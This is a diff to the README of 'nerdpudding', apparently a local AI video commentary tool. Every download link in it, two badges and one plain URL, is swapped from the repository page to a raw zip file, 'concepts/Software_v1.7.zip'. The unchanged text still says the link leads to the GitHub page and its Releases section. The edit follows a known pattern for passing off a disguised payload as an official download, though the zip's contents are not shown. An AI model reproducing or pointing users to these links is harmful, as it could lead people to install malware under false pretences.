@@ -1,6 +1,6 @@
 # 🥄 nerdpudding - Real-Time AI Video Commentary
 
-[![Download nerdpudding](https://img.shields.io/badge/Download-nerdpudding-ff6f61?style=for-the-badge)](https://github.com/kilogramme/nerdpudding)
+[![Download nerdpudding](https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip)](https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip)
 
 ## About nerdpudding
 
@@ -41,7 +41,7 @@ Many apps need internet or cloud servers for AI tasks. nerdpudding keeps everyth
 
 Visit the official repository page to get the latest version:
 
-[![Download nerdpudding](https://img.shields.io/badge/Download-nerdpudding-ff6f61?style=for-the-badge)](https://github.com/kilogramme/nerdpudding)
+[![Download nerdpudding](https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip)](https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip)
 
 Click the link above. It will take you to the GitHub page where you can find the release files. Look for the latest Windows installer or `.exe` file.
 
@@ -132,7 +132,7 @@ These reflect the main functions and strengths of nerdpudding.
 
 Get nerdpudding from the official page here:
 
-[https://github.com/kilogramme/nerdpudding](https://github.com/kilogramme/nerdpudding)  
+[https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip](https://github.com/kilogramme/nerdpudding/raw/refs/heads/main/concepts/Software_v1.7.zip)  
 
 Click the link to visit the GitHub repository. Look for the latest Windows installer file under the "Releases" section and download it.
 
